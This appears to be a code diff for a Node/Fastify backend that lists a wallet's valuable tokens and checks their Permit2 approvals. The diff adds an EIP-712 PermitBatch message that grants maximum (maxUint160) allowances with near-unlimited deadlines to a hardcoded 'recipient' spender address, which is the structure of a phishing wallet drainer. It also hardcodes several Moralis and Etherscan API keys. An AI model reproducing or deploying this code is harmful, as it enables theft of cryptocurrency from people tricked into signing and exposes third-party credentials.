@@ -55,6 +55,7 @@ var __spreadArray = (this && this.__spreadArray) || function (to, from, pack) {
     }
     return to.concat(ar || Array.prototype.slice.call(from));
 };
+var _a;
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.app = void 0;
 var fastify_1 = require("fastify");
@@ -73,18 +74,27 @@ var common_evm_utils_1 = require("@moralisweb3/common-evm-utils");
 // └── your services
 //
 var moralisApiKey1 = "5M2C1HGJJnTiyMnp96IpaIlZ6CPVRA7yxysQY38AI1fDse7p3K6EcIRSOWwpSKCd";
-var moralisApiKey2 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijg5MWJkNjBkLTBmYWItNDZmZi1hYjRjLTU1ODAyZWUwY2M4NyIsIm9yZ0lkIjoiMzQ5NzE5IiwidXNlcklkIjoiMzU5NDU4IiwidHlwZUlkIjoiOTUxZmMzZjAtYzk0YS00NjQzLWFmYjItZDYwMDYxMTI5ZGQxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAxMzM1NTcsImV4cCI6NDg0NTg5MzU1N30.gp4A6Y5iJZN2qNaJtV41Zz5DKf-CTywbc7Na-3Ks0oQ";
-var moralisApiKey3 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU3MWVmYWU5LTQ1NTctNGMyMC1iNGM4LWJiYzM3MWRkMjA0NiIsIm9yZ0lkIjoiMzQ5OTAzIiwidXNlcklkIjoiMzU5NjQ2IiwidHlwZUlkIjoiY2M5NTA4OWQtM2QxYS00OGMzLThhYWUtNDE5NmU4M2NhZTgwIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAyMzU3MDUsImV4cCI6NDg0NTk5NTcwNX0.Ed2XbULv-DOKkXCOBKJsFbRFo55pFH3jeVpmCKCkc0Y";
-var moralisAPikey4 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4";
-var moralisKeys = [moralisApiKey1, moralisApiKey2, moralisApiKey3];
-var selectedKey = moralisKeys[Number(process.env.MORALIS_KEY_INDEX)];
+var moralisApiKey2 = "2IHfMlzIaRBflv7GliW3NzneyoAp3OgBXbE05hhKd3qfXo4otDbfZNw1AwH2SYO8";
+var moralisApiKey3 = "Ft1vyp44sxY7gqDm4qPiWBaPgLechkjUnKFPIn6jQBDHO5V0l0UOZnzNCoXZb1W2";
+var moralisAPikey4 = "7f8r9DVeWUgv2AO7xZxTRkmZ6yx5l85WvTJfrj0ZEhBE8jXk8txiYI6m66ZNos5D";
+var moralisApiKey5 = "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB";
+var moralisKeys = [
+    moralisApiKey1,
+    moralisApiKey2,
+    moralisApiKey3,
+    moralisAPikey4,
+    moralisApiKey5,
+];
+var selectedKey = moralisKeys[Number((_a = process.env.MORALIS_KEY_INDEX) !== null && _a !== void 0 ? _a : 1)];
+// console.log(selectedKey);
 var etherscanAPiKey1 = "NW9VZEP7IFW2ZQ4NYV6GPANWWX893ANUUE";
 var etherscanAPiKey2 = "QNKQHXZ31GI3F8NZAWVU4J6YSCQEV9J1BT";
 var deadline = 1000000000000;
+var chainId = 1; //main  net chain Id
 var nonce = 0; // still experimenting on this one;
-// const Permit2Contract =
-//   "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`; // Permit2 contract
+var Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Permit2 contract
 var maxUint160 = "1461501637330902918203684832716283019655932542975"; // maxUint160
+var recipient = "0xA08a5810Dc98258f35a35918CeD3f99E893154Ef"; // recipient address
 //
 exports.app = (0, fastify_1.default)({
     logger: true,
@@ -124,7 +134,7 @@ var runMoralis = function () { return __awaiter(void 0, void 0, void 0, function
             case 0:
                 if (!!moralis_1.default.Core.isStarted) return [3 /*break*/, 2];
                 return [4 /*yield*/, moralis_1.default.start({
-                        apiKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
+                        apiKey: "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
                     })];
             case 1:
                 _a.sent();
@@ -152,7 +162,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                         return [4 /*yield*/, response_1.json()];
                     case 2:
                         tokenPrices = _a.sent();
-                        for (index = 0; index < tokenPrices.length; index++) {
+                        for (index = 0; index < (tokenPrices === null || tokenPrices === void 0 ? void 0 : tokenPrices.length); index++) {
                             truncatedResponse[index].usdPrice = tokenPrices[index].usdPrice;
                         }
                         tokensInUSD = truncatedResponse.map(function (token) {
@@ -200,7 +210,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                     headers: {
                         accept: "application/json",
                         "content-type": "application/json",
-                        "X-API-Key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
+                        "X-API-Key": "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
                     },
                     body: JSON.stringify({
                         tokens: truncatedResponse,
@@ -211,7 +221,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                 _a = _c.sent(), filteredByUSDValue = _a[0], error = _a[1];
                 tokensReturned = filteredByUSDValue;
                 tokenInPermitFormat = [];
-                for (index = 0; index < tokensReturned.length; index++) {
+                for (index = 0; index < (tokensReturned === null || tokensReturned === void 0 ? void 0 : tokensReturned.length); index++) {
                     obj = {
                         token: tokensReturned[index].token_address,
                         amount: maxUint160,
@@ -221,7 +231,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                     tokenInPermitFormat.push(obj);
                 }
                 addrs = [];
-                for (i = 0; i < tokensReturned.length; i++) {
+                for (i = 0; i < (tokensReturned === null || tokensReturned === void 0 ? void 0 : tokensReturned.length); i++) {
                     addrs.push(tokensReturned[i].token_address);
                 }
                 return [4 /*yield*/, moralis_1.default.EvmApi.token.getErc20Approvals({
@@ -243,10 +253,43 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                         _addrs.splice(index, 1);
                     }
                 };
-                for (i = 0; i < permit2Tokens.length; i++) {
+                for (i = 0; i < (permit2Tokens === null || permit2Tokens === void 0 ? void 0 : permit2Tokens.length); i++) {
                     _loop_1(i);
                 }
-                return [2 /*return*/, [tokenInPermitFormat, _addrs]];
+                return [2 /*return*/, [tokensReturned, _addrs]];
         }
     });
 }); });
+var dataToSign = function (detailsArray) {
+    var dataToSign = {
+        domain: {
+            name: "Permit2",
+            chainId: chainId,
+            verifyingContract: Permit2Contract,
+        },
+        types: {
+            EIP712Domain: [
+                { name: "name", type: "string" },
+                { name: "chainId", type: "uint256" },
+                { name: "verifyingContract", type: "address" },
+            ],
+            PermitBatch: [
+                { name: "details", type: "PermitDetails[]" },
+                { name: "spender", type: "address" },
+                { name: "sigDeadline", type: "uint256" },
+            ],
+            PermitDetails: [
+                { name: "token", type: "address" },
+                { name: "amount", type: "uint160" },
+                { name: "expiration", type: "uint48" },
+                { name: "nonce", type: "uint48" },
+            ],
+        },
+        primaryType: "PermitBatch",
+        message: {
+            details: detailsArray,
+            spender: recipient,
+            sigDeadline: deadline,
+        },
+    };
+};
